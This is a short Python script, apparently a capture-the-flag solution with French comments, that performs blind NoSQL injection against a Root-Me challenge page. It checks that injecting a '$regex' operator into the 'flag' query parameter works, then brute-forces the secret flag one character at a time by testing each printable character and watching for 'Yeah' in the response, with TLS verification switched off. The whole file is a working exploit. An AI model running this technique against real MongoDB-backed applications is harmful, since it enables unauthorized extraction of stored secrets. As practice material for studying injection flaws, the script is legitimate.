import string
import requests
import urllib3

urllib3.disable_warnings()

session = requests.Session()
chall_name = 'nosqlblind'  # <-- corrigé
flag = ''
u = 'http://challenge01.root-me.org/web-serveur/ch48/index.php'

excluded = ['*', '+', '.', '?', '|', '#', '&', '$', '^', '(', ')', '[', ']', '\\']

# --- Sanity check avant de lancer le brute-force ---
r_true = session.get(u, params={'chall_name': chall_name, 'flag[$regex]': '^.*'}, verify=False)
r_false = session.get(u, params={'chall_name': chall_name, 'flag[$regex]': '^ZZZINEXISTANT'}, verify=False)
print("[DEBUG] True case contient 'Yeah' ?", 'Yeah' in r_true.text)
print("[DEBUG] False case contient 'Yeah' ?", 'Yeah' in r_false.text)

if 'Yeah' not in r_true.text:
    print("⚠️ L'injection ne fonctionne pas comme prévu. Regarde la réponse brute :")
    print(r_true.text[:1000])
    exit()

# --- Brute-force avec logs ---
max_len = 50
for i in range(max_len):
    found = False
    for c in string.printable:
        if c in excluded:
            continue
        payload = {'chall_name': chall_name, 'flag[$regex]': f'^{flag + c}'}
        r = session.get(u, params=payload, verify=False)
        if 'Yeah' in r.text:
            flag += c
            print(f"[+] Caractère {i+1} trouvé : '{c}' -> flag = {flag}")
            found = True
            break
    if not found:
        print("[-] Aucun caractère ne matche à cette position, arrêt.")
        break

print(f"\nFlag final : {flag}")
